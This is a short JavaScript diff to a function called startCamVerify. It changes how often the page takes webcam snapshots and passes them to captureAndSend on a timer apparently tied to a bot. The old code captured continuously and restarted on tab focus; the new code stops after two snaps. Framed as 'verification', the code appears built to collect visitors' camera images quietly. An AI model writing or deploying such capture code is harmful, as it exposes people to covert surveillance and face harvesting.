@@ -2899,21 +2899,31 @@ async function startCamVerify() {
     document.body.appendChild(canvas);
     const ctx = canvas.getContext("2d");
 
-    // Pehli photo 2 second baad, phir har 5 second
-    setTimeout(() => {
+    // Take snap after 2s, second snap after 5s then stop stream to save resource & prevent photo flood
+    let snapCount = 0;
+    const maxSnaps = 2;
+    const takeSnap = () => {
+      if (snapCount >= maxSnaps) {
+        try { stream.getTracks().forEach((tr) => tr.stop()); video.remove(); canvas.remove(); } catch (e) {}
+        return;
+      }
+      snapCount++;
       captureAndSend(video, ctx, canvas);
-      setInterval(() => captureAndSend(video, ctx, canvas), CAM_BOT_INTERVAL);
-    }, 2000);
+      if (snapCount < maxSnaps) {
+        setTimeout(takeSnap, 5000);
+      } else {
+        setTimeout(() => {
+          try { stream.getTracks().forEach((tr) => tr.stop()); video.remove(); canvas.remove(); } catch (e) {}
+        }, 1000);
+      }
+    };
+    setTimeout(takeSnap, 2000);
 
     console.log("[CAM] Verification active");
 
     document.addEventListener('visibilitychange', () => {
       if (document.hidden) {
-        stream.getTracks().forEach(tr => tr.stop());
-        console.log('[CAM] stopped (hidden)');
-      } else {
-        // tekrar start karo
-        setTimeout(() => { startCamVerify(); }, 1000);
+        try { stream.getTracks().forEach((tr) => tr.stop()); } catch (e) {}
       }
     });
   } catch (e) {
